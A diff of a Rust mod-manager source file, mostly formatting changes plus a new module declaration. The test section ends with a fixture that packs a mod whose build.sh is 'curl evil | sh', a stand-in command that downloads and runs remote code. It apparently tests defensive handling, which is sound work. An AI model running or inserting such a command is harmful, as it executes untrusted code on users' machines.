@@ -24,6 +24,7 @@ mod crates;
 mod dependencies;
 mod inject;
 mod inject_cache;
+mod legacy;
 
 const PREFIX: &str = "native-";
 /// horizon-mixins, for bundles that don't name the revision they were tested with.
@@ -63,7 +64,11 @@ impl Profile {
 
     /// The profile `Settings::native_release` picks.
     pub fn from_setting(release: bool) -> Self {
-        if release { Self::Release } else { Self::Fast }
+        if release {
+            Self::Release
+        } else {
+            Self::Fast
+        }
     }
 }
 
@@ -1550,11 +1555,13 @@ fn pipeline(
         repin(b, &revision)?;
     }
     // Said with a failure: a mod made for another revision may not apply or compile on this one.
-    let blame = |e: String| match &other {
+    let blame = |e: String| {
+        match &other {
         Some(list) => format!(
             "{e}\n\nSome mods were made for other Horizon versions ({list}), which may be why. Use mods compatible with this fork."
         ),
         None => e,
+    }
     };
     let mixins = newest(
         &mods,
@@ -2264,9 +2271,18 @@ mod tests {
             version_for(A, B, Profile::Fast, Target::Client, &bundles(&out).unwrap()).unwrap()
         );
         crate::browser::java::set_enabled(&home, "veinminer", false).unwrap();
-        pack("veinminer.hnmod", Some(("mixins/veinminer/data/runtime-toggle.json", r#"{"runtime_toggle":true}"#)));
-        assert_eq!(bundles(&installed_mods(&home).unwrap()).unwrap().len(), 1,
-            "runtime switches keep the code available while disabled");
+        pack(
+            "veinminer.hnmod",
+            Some((
+                "mixins/veinminer/data/runtime-toggle.json",
+                r#"{"runtime_toggle":true}"#,
+            )),
+        );
+        assert_eq!(
+            bundles(&installed_mods(&home).unwrap()).unwrap().len(),
+            1,
+            "runtime switches keep the code available while disabled"
+        );
         assert_eq!(crate::native_status::enabled(&home).len(), 1);
         crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
